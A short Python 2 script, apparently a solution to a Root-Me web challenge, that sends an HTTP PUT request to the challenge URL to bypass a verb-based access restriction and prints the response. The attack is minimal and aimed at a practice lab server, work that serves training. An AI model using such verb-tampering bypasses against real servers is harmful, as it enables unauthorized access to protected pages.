#payload by pass verp 
import requests
res=requests.put("http://challenge01.root-me.org/web-serveur/ch8/")
print res.content # .content show source web
